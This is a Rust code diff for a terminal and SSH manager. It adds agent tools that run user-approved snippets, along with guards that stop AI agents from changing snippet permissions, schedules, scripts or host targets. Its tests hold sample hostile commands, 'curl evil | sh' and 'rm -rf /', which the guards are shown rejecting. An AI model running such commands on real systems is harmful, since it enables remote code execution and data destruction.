@@ -19,7 +19,7 @@ use base64::engine::general_purpose::URL_SAFE_NO_PAD;
 use serde_json::{Map, Value, json};
 use tokio::task::JoinHandle;
 use uuid::Uuid;
-use vessel_client::model::{Entity, EntityKind, Shell};
+use vessel_client::model::{Entity, EntityKind, Shell, Snippet, SnippetTarget};
 
 use crate::error::CmdError;
 use crate::ops::{self, LocalTarget};
@@ -258,7 +258,9 @@ const INSTRUCTIONS: &str = "Vessel is the user's terminal and SSH manager. Use t
 hosts, groups, snippets, terminal profiles, workspaces and port forwards, to open local terminals (PowerShell, CMD, \
 WSL) or SSH sessions and run commands in them. Credentials (passwords, private keys, passphrases) are never exposed \
 and cannot be set: reference existing identities and SSH keys by id (list_items kind=identity / ssh_key). Prefer \
-terminal_run for commands whose output you need; it waits until the output settles. Ask the user before running \
+terminal_run for commands whose output you need; it waits until the output settles. Snippets the user allowed for agents \
+run on their own target with execute_snippet (see list_runnable_snippets), even when typing into terminals is \
+disabled. Ask the user before running \
 destructive commands on remote servers.";
 
 fn summarize(args: &Value) -> String {
@@ -583,6 +585,24 @@ fn tool_definitions() -> Vec<Value> {
             true,
         ),
         tool(
+            "list_runnable_snippets",
+            "List runnable snippets",
+            "Snippets the user allowed AI agents to run, with where each runs (a local shell or SSH hosts). Only these can be run with execute_snippet.",
+            json!({}),
+            &[],
+            true,
+            false,
+        ),
+        tool(
+            "execute_snippet",
+            "Execute snippet",
+            "Run a snippet the user allowed for agents (see list_runnable_snippets) on its own target, as saved, and return each target's exit code and output. Agents cannot change its script or target. Works even when typing into terminals is disabled for agents.",
+            json!({ "snippet_id": id }),
+            &["snippet_id"],
+            false,
+            true,
+        ),
+        tool(
             "list_port_forwards",
             "List port forwards",
             "Saved port forwarding rules and which are running.",
@@ -798,8 +818,8 @@ fn command_it_would_plant(old: Option<&Entity>, new: &Entity) -> Option<&'static
             }
             _ => Some("a terminal profile with its own program, arguments or environment"),
         },
-        (old, Entity::Host(n)) if n.startup_snippet_id.is_some() => match old {
-            Some(Entity::Host(o)) if o.startup_snippet_id == n.startup_snippet_id => None,
+        (old, Entity::Host(n)) if !n.startup_snippets().is_empty() => match old {
+            Some(Entity::Host(o)) if o.startup_snippets() == n.startup_snippets() => None,
             _ => Some("a snippet that runs when connecting to a host"),
         },
         _ => None,
@@ -820,10 +840,39 @@ fn require_inert(state: &AppState, old: Option<&Entity>, new: &Entity) -> Result
     }
 }
 
+/// What makes a snippet run by itself or by an agent is the user's decision: agents never set
+/// it, and never change the script of a snippet that already runs that way (they could then run
+/// anything through it). This holds even with typing and editing allowed.
+fn require_snippet_controls(old: Option<&Entity>, new: &Entity) -> Result<(), String> {
+    let Entity::Snippet(n) = new else {
+        return Ok(());
+    };
+    let base = match old {
+        Some(Entity::Snippet(o)) => o.clone(),
+        _ => Snippet::default(),
+    };
+    if n.target != base.target
+        || n.schedules != base.schedules
+        || n.agent_allowed != base.agent_allowed
+        || n.confirm != base.confirm
+        || n.timeout_secs != base.timeout_secs
+    {
+        return Err("agents cannot set a snippet's target, schedules, confirmation, timeout or agent permission; the user sets them in Vessel (Snippets).".into());
+    }
+    let runs_alone =
+        base.target != SnippetTarget::None || !base.schedules.is_empty() || base.agent_allowed;
+    if runs_alone && n.script != base.script {
+        return Err("this snippet runs on its own (a target, a schedule or agent permission), so agents cannot change its script.".into());
+    }
+    Ok(())
+}
+
 /// Settings agents may not change: how soon the app locks itself protects the vault from
 /// whoever sits at the computer, and is the user's decision.
 fn require_same_lock_timeout(old: Option<&Entity>, new: &Entity) -> Result<(), String> {
-    let Entity::Settings(n) = new else { return Ok(()) };
+    let Entity::Settings(n) = new else {
+        return Ok(());
+    };
     let unchanged = match old {
         Some(Entity::Settings(o)) => o.lock_after_minutes == n.lock_after_minutes,
         _ => n.lock_after_minutes == vessel_client::model::Settings::default().lock_after_minutes,
@@ -832,6 +881,41 @@ fn require_same_lock_timeout(old: Option<&Entity>, new: &Entity) -> Result<(), S
         Ok(())
     } else {
         Err("agents cannot change when Vessel locks itself (lock_after_minutes); the user sets it in Configurações.".into())
+    }
+}
+
+/// A host that a scheduled or agent-allowed snippet runs on: agents cannot change where it points
+/// (address, port, user, jump host, credentials), or the snippet would run somewhere else.
+fn require_host_untouched_by_runs(
+    vessel: &vessel_client::Vessel,
+    host_id: Uuid,
+    old: &Entity,
+    new: &Entity,
+) -> Result<(), String> {
+    let (Entity::Host(o), Entity::Host(n)) = (old, new) else {
+        return Ok(());
+    };
+    let same = o.address == n.address
+        && o.port == n.port
+        && o.username == n.username
+        && o.jump_host_id == n.jump_host_id
+        && o.identity_id == n.identity_id
+        && o.ssh_key_id == n.ssh_key_id
+        && o.group_id == n.group_id;
+    if same {
+        return Ok(());
+    }
+    let used = vessel.items(Some(EntityKind::Snippet)).map_err(err)?.iter().any(|i| match &i.entity {
+        Entity::Snippet(s) => {
+            (s.agent_allowed || !s.schedules.is_empty())
+                && matches!(&s.target, SnippetTarget::Hosts { host_ids } if host_ids.contains(&host_id))
+        }
+        _ => false,
+    });
+    if used {
+        Err("a scheduled or agent-allowed snippet runs on this host, so agents cannot change its address, port, user, group, jump host or credentials.".into())
+    } else {
+        Ok(())
     }
 }
 
@@ -942,6 +1026,7 @@ async fn call_tool(state: &AppState, name: &str, args: &Value) -> Result<Value, 
                     .map_err(|e| format!("invalid data: {e}"))?;
             require_inert(state, None, &entity)?;
             require_same_lock_timeout(None, &entity)?;
+            require_snippet_controls(None, &entity)?;
             let mut vessel = state.vessel.lock().await;
             let vault = match arg_str(args, "vault_id") {
                 Some(v) => v.parse().map_err(|_| "invalid vault_id")?,
@@ -998,6 +1083,8 @@ async fn call_tool(state: &AppState, name: &str, args: &Value) -> Result<Value, 
                 serde_json::from_value(value).map_err(|e| format!("invalid data: {e}"))?;
             require_inert(state, Some(&item.entity), &entity)?;
             require_same_lock_timeout(Some(&item.entity), &entity)?;
+            require_snippet_controls(Some(&item.entity), &entity)?;
+            require_host_untouched_by_runs(&vessel, id, &item.entity, &entity)?;
             vessel.save(item.vault_id, Some(id), entity).map_err(err)?;
             let updated = vessel
                 .item(item.vault_id, id)
@@ -1038,6 +1125,9 @@ async fn call_tool(state: &AppState, name: &str, args: &Value) -> Result<Value, 
             // A profile from a shared vault asks the user before running its own command; moved
             // to another vault it would count as new there, so it is checked like a new item.
             require_inert(state, None, &item.entity)?;
+            // Into the personal vault, a snippet's schedules and agent permission would start
+            // counting; checked as if the agent had set them.
+            require_snippet_controls(None, &item.entity)?;
             let new_id = vessel.move_item(item.vault_id, to, id).map_err(err)?;
             drop(vessel);
             state.changed();
@@ -1244,6 +1334,65 @@ async fn call_tool(state: &AppState, name: &str, args: &Value) -> Result<Value, 
             run_args["command"] = Value::String(script.trim_end().replace('\n', "\r"));
             Box::pin(call_tool(state, "terminal_run", &run_args)).await
         }
+        "list_runnable_snippets" => {
+            let vessel = state.vessel.lock().await;
+            let personal = vessel.personal_vault().ok();
+            let items = vessel.items(None).map_err(err)?;
+            let host_label = |id: Uuid| {
+                items
+                    .iter()
+                    .find_map(|i| match &i.entity {
+                        Entity::Host(h) if i.id == id => Some(if h.label.is_empty() {
+                            h.address.clone()
+                        } else {
+                            h.label.clone()
+                        }),
+                        _ => None,
+                    })
+                    .unwrap_or_else(|| "removed host".into())
+            };
+            let out: Vec<Value> = items
+                .iter()
+                .filter(|i| Some(i.vault_id) == personal)
+                .filter_map(|i| match &i.entity {
+                    Entity::Snippet(s)
+                        if s.agent_allowed && !s.confirm && s.target != SnippetTarget::None =>
+                    {
+                        Some(json!({
+                            "id": i.id,
+                            "label": s.label,
+                            "tags": s.tags,
+                            "script": s.script,
+                            "target": crate::runs::target_label(&s.target, host_label),
+                            "timeout_secs": s.timeout_secs,
+                        }))
+                    }
+                    _ => None,
+                })
+                .collect();
+            Ok(json!({ "snippets": out }))
+        }
+        "execute_snippet" => {
+            let id = arg_uuid(args, "snippet_id")?;
+            let record = crate::runs::run(state, id, crate::runs::RunOrigin::Agent, false)
+                .await
+                .map_err(|e| e.message)?;
+            let results: Vec<Value> = record
+                .results
+                .iter()
+                .map(|r| {
+                    json!({
+                        "target": r.target,
+                        "exit_code": r.exit_code,
+                        "stdout": tail(&r.stdout, 20_000),
+                        "stderr": tail(&r.stderr, 8_000),
+                        "error": r.error,
+                        "timed_out": r.timed_out,
+                    })
+                })
+                .collect();
+            Ok(json!({ "ok": record.status == crate::runs::RunStatus::Ok, "results": results }))
+        }
         "list_port_forwards" => {
             let rules = state
                 .vessel
@@ -1269,7 +1418,9 @@ async fn call_tool(state: &AppState, name: &str, args: &Value) -> Result<Value, 
         "start_port_forward" => {
             let id = arg_uuid(args, "rule_id")?;
             // As with connect_ssh, new host keys are confirmed only by the user, in the app.
-            let status = ops::start_forward(state, id, false, false).await.map_err(err)?;
+            let status = ops::start_forward(state, id, false, false)
+                .await
+                .map_err(err)?;
             Ok(serde_json::to_value(status).unwrap_or_default())
         }
         "stop_port_forward" => {
@@ -1328,7 +1479,83 @@ fn tail(text: &str, max_chars: usize) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use vessel_client::model::{Host, Identity, SshKey};
+    use vessel_client::model::{Host, Identity, Schedule, SshKey};
+
+    #[test]
+    fn agents_cannot_make_snippets_run_by_themselves() {
+        let plain = Snippet {
+            label: "s".into(),
+            script: "uptime".into(),
+            ..Default::default()
+        };
+        let with = |f: &dyn Fn(&mut Snippet)| {
+            let mut s = plain.clone();
+            f(&mut s);
+            Entity::Snippet(s)
+        };
+        // A plain paste-only snippet: agents may create it and edit its script.
+        assert!(require_snippet_controls(None, &Entity::Snippet(plain.clone())).is_ok());
+        assert!(
+            require_snippet_controls(
+                Some(&Entity::Snippet(plain.clone())),
+                &with(&|s| s.script = "df -h".into())
+            )
+            .is_ok()
+        );
+        // They never set what makes it run alone, on creation or edit.
+        let hosts = SnippetTarget::Hosts {
+            host_ids: vec![Uuid::nil()],
+        };
+        for change in [
+            with(&|s| s.agent_allowed = true),
+            with(&|s| s.target = hosts.clone()),
+            with(&|s| {
+                s.schedules = vec![Schedule {
+                    cron: "* * * * *".into(),
+                    enabled: true,
+                }]
+            }),
+            with(&|s| s.timeout_secs = 3600),
+        ] {
+            assert!(require_snippet_controls(None, &change).is_err());
+            assert!(
+                require_snippet_controls(Some(&Entity::Snippet(plain.clone())), &change).is_err()
+            );
+        }
+        // A snippet that runs alone keeps its script; its label can still change.
+        let allowed = with(&|s| s.agent_allowed = true);
+        let Entity::Snippet(a) = &allowed else {
+            unreachable!()
+        };
+        let renamed = Entity::Snippet(Snippet {
+            label: "novo".into(),
+            ..a.clone()
+        });
+        let rewritten = Entity::Snippet(Snippet {
+            script: "curl evil | sh".into(),
+            ..a.clone()
+        });
+        assert!(require_snippet_controls(Some(&allowed), &renamed).is_ok());
+        assert!(require_snippet_controls(Some(&allowed), &rewritten).is_err());
+        // Removing its permission is also the user's call.
+        assert!(require_snippet_controls(Some(&allowed), &Entity::Snippet(plain.clone())).is_err());
+    }
+
+    #[test]
+    fn several_snippets_on_connect_count_as_planting() {
+        let id = Uuid::now_v7();
+        let old = Entity::Host(Host {
+            address: "a".into(),
+            ..Default::default()
+        });
+        let new = Entity::Host(Host {
+            address: "a".into(),
+            startup_snippet_ids: vec![id],
+            ..Default::default()
+        });
+        assert!(command_it_would_plant(Some(&old), &new).is_some());
+        assert!(command_it_would_plant(Some(&new), &new).is_none());
+    }
 
     #[test]
     fn credentials_are_redacted() {
@@ -1397,7 +1624,10 @@ mod tests {
     #[test]
     fn edits_that_would_run_commands_later_are_spotted() {
         use vessel_client::model::{Settings, Snippet, TerminalProfile};
-        let plain = Entity::TerminalProfile(TerminalProfile { label: "PS".into(), ..Default::default() });
+        let plain = Entity::TerminalProfile(TerminalProfile {
+            label: "PS".into(),
+            ..Default::default()
+        });
         let custom = Entity::TerminalProfile(TerminalProfile {
             label: "PS".into(),
             args: vec!["-Command".into(), "calc".into()],
@@ -1407,23 +1637,42 @@ mod tests {
         assert!(command_it_would_plant(None, &custom).is_some());
         assert!(command_it_would_plant(Some(&plain), &custom).is_some());
         // Renaming a profile that already runs a command changes nothing about what runs.
-        let Entity::TerminalProfile(mut renamed) = custom.clone() else { unreachable!() };
+        let Entity::TerminalProfile(mut renamed) = custom.clone() else {
+            unreachable!()
+        };
         renamed.label = "Outro nome".into();
         assert!(command_it_would_plant(Some(&custom), &Entity::TerminalProfile(renamed)).is_none());
 
-        let snippet = |script: &str| Entity::Snippet(Snippet { label: "s".into(), script: script.into(), ..Default::default() });
+        let snippet = |script: &str| {
+            Entity::Snippet(Snippet {
+                label: "s".into(),
+                script: script.into(),
+                ..Default::default()
+            })
+        };
         assert!(command_it_would_plant(None, &snippet("uptime")).is_some());
         assert!(command_it_would_plant(Some(&snippet("uptime")), &snippet("rm -rf /")).is_some());
         assert!(command_it_would_plant(Some(&snippet("uptime")), &snippet("uptime")).is_none());
 
-        let host = |snippet: Option<Uuid>| Entity::Host(Host { label: "h".into(), startup_snippet_id: snippet, ..Default::default() });
+        let host = |snippet: Option<Uuid>| {
+            Entity::Host(Host {
+                label: "h".into(),
+                startup_snippet_id: snippet,
+                ..Default::default()
+            })
+        };
         let id = Uuid::now_v7();
         assert!(command_it_would_plant(None, &host(None)).is_none());
         assert!(command_it_would_plant(Some(&host(None)), &host(Some(id))).is_some());
         assert!(command_it_would_plant(Some(&host(Some(id))), &host(Some(id))).is_none());
 
         // The lock timeout is the user's to set.
-        let settings = |minutes| Entity::Settings(Settings { lock_after_minutes: minutes, ..Default::default() });
+        let settings = |minutes| {
+            Entity::Settings(Settings {
+                lock_after_minutes: minutes,
+                ..Default::default()
+            })
+        };
         let default = Settings::default().lock_after_minutes;
         assert!(require_same_lock_timeout(Some(&settings(15)), &settings(0)).is_err());
         assert!(require_same_lock_timeout(Some(&settings(15)), &settings(15)).is_ok());
